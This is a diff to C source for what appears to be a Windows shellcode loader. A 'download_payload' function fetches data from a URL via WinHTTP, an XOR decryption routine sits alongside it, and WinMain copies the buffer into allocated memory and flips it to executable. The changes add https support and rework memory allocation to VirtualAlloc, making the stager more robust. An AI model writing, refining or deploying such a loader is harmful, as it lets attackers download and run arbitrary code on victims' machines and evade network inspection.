@@ -79,10 +79,9 @@ static void xor_decrypt(unsigned char *buf, SIZE_T len,
 /*
  * download_payload — fetch URL using WinHTTP.
  * Allocates a heap buffer, fills it with the response body, and sets *out_len.
- * Returns NULL on any error; caller must LocalFree() the returned buffer.
+ * Returns NULL on any error; caller must VirtualFree(buf, 0, MEM_RELEASE).
  *
- * Supports http:// only (WINHTTP_FLAG_SECURE not set).
- * For https: pass port 443 and add WINHTTP_FLAG_SECURE to WinHttpOpenRequest.
+ * Supports http:// and https:// (scheme detected from URL).
  */
 static unsigned char *download_payload(const char *url_str, SIZE_T *out_len) {
     *out_len = 0;
@@ -150,35 +149,57 @@ static unsigned char *download_payload(const char *url_str, SIZE_T *out_len) {
     }
     if (!WinHttpReceiveResponse(hRequest, NULL)) goto cleanup;
 
-    /* --- read response body ------------------------------------------------ */
+    /* --- pre-allocate using Content-Length when available ------------------- */
+    DWORD contentLen = 0;
+    {
+        WCHAR clbuf[32];
+        DWORD clbufLen = sizeof(clbuf);
+        if (WinHttpQueryHeaders(hRequest,
+                WINHTTP_QUERY_CONTENT_LENGTH, WINHTTP_HEADER_NAME_BY_INDEX,
+                clbuf, &clbufLen, WINHTTP_NO_HEADER_INDEX))
+            contentLen = (DWORD)wcstoul(clbuf, NULL, 10);
+    }
+
+    /* --- read response body (VirtualAlloc avoids LMEM_MOVEABLE handle mis-use) */
     unsigned char *body    = NULL;
-    SIZE_T         body_sz = 0;
+    SIZE_T         body_cap = 0;
+    SIZE_T         body_sz  = 0;
+
+    if (contentLen > 0) {
+        body = (unsigned char *)VirtualAlloc(NULL, contentLen + 4096,
+            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        body_cap = contentLen + 4096;
+    }
 
     DWORD avail = 0;
-    DWORD read  = 0;
+    DWORD nread = 0;
     do {
         avail = 0;
         if (!WinHttpQueryDataAvailable(hRequest, &avail)) break;
         if (avail == 0) break;
 
-        unsigned char *tmp = (unsigned char *)LocalReAlloc(
-                body ? body : NULL,
-                body_sz + avail,
-                LMEM_MOVEABLE | LMEM_ZEROINIT);
-        if (!tmp) {
-            if (body) LocalFree(body);
-            body = NULL;
-            break;
+        if (body == NULL || body_sz + avail > body_cap) {
+            SIZE_T new_cap = (body_sz + avail + 65536 + 0xFFFF) & ~(SIZE_T)0xFFFF;
+            unsigned char *new_body = (unsigned char *)VirtualAlloc(NULL, new_cap,
+                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+            if (!new_body) {
+                if (body) VirtualFree(body, 0, MEM_RELEASE);
+                body = NULL;
+                break;
+            }
+            if (body && body_sz) memcpy(new_body, body, body_sz);
+            if (body) VirtualFree(body, 0, MEM_RELEASE);
+            body     = new_body;
+            body_cap = new_cap;
         }
-        body = tmp;
 
-        read = 0;
-        if (!WinHttpReadData(hRequest, body + body_sz, avail, &read)) {
-            LocalFree(body);
+        nread = 0;
+        if (!WinHttpReadData(hRequest, body + body_sz, avail, &nread)) {
+            VirtualFree(body, 0, MEM_RELEASE);
             body = NULL;
             break;
         }
-        body_sz += read;
+        body_sz += nread;
     } while (avail > 0);
 
     WinHttpCloseHandle(hRequest);
@@ -189,7 +210,7 @@ static unsigned char *download_payload(const char *url_str, SIZE_T *out_len) {
         *out_len = body_sz;
         return body;
     }
-    if (body) LocalFree(body);
+    if (body) VirtualFree(body, 0, MEM_RELEASE);
     return NULL;
 
 cleanup:
@@ -222,10 +243,10 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nShow)
             NULL, sc_len,
             MEM_COMMIT | MEM_RESERVE,
             PAGE_READWRITE);
-    if (!exec_mem) { LocalFree(sc); return 1; }
+    if (!exec_mem) { VirtualFree(sc, 0, MEM_RELEASE); return 1; }
 
     memcpy(exec_mem, sc, sc_len);
-    LocalFree(sc);
+    VirtualFree(sc, 0, MEM_RELEASE);
 
     /* 5. Flip to RX */
     DWORD old_prot = 0;
